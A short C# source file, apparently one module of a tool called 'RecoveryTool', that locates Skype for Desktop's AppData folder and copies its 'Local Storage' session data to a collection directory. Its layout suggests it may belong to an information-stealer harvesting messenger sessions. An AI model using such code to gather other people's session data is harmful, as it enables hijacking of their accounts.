using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class SkypeService
    {
        public static async Task SaveSkypeAsync()
        {
            string skypeFolder = Path.Combine(Common.AppData, "Microsoft", "Skype for Desktop");
            if (!Directory.Exists(skypeFolder)) return;

            string skypeSession = Common.EnsureSkypePath();

            await MessengerHelper.CopyDirectoryAsync(Path.Combine(skypeFolder, "Local Storage"), Path.Combine(skypeSession, "Local Storage"));
        }
    }
}